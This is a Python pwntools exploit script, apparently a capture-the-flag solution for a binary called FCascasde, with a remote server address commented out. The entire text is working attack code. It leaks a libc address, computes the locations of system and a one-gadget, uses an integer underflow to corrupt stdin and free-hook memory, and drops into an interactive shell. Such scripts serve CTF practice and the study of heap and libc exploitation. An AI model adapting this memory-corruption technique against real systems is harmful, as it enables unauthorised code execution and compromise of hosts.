from pwn import *

#context.log_level="debug"

s = process('./FCascasde')
#s = remote("178.62.40.102" , "6002")
e = ELF('./FCascasde')

def leak_vec(size, content):
	s.sendline("111010101")
	s.recvuntil("> ")
	s.sendline(size) 
	s.recvuntil("> ")
	s.send(content)
	s.recvuntil("> ")

def ccloud():
	s.sendline("10110101")
	s.recvuntil("> ")

def leak(size):
	s.sendline("11010110") 
	s.recvuntil("> ")
	s.send("11111112")
	
	s.recv(296)

	#s.recv(size)
	leak = u64(s.recv(6)+"\x00"*2)
	s.recv()
	print 'leak   : ' + str(hex(leak))
	return leak

def leak_to_main():
	s.sendline("11111111")
	s.recvuntil("> ")
	
s.recvuntil("> ")
leak_vec("296", "A"*296)
leak = leak("128")
leak_to_main()

libc = leak - 0x3da7cb
system = libc + 0x45390
stdin = libc + 0x3c4919
free = libc + 0x3c67a8

oneshot = libc + 0x4526a

tmpnam = free - 168

print 'libc   : ' + str(hex(libc))
print 'system : ' + str(hex(system))
print 'stdin  : ' + str(hex(stdin))
print 'free   : ' + str(hex(free))
print 'tmpnam : ' + str(hex(tmpnam))

ccloud()

underflow = -(0x10000000000000000-stdin)
#print 'underflow : ' + str(underflow)
s.sendline(str(underflow))
s.recv()
s.send(p64(free)+p64(free)+p64(free)+p64(free)+p64(free+0x10)+p64(0))

s.sendline("pwnWiz")
s.sendline("\x00"*168+p64(oneshot))
sleep(0.2)
s.recv()

s.interactive()
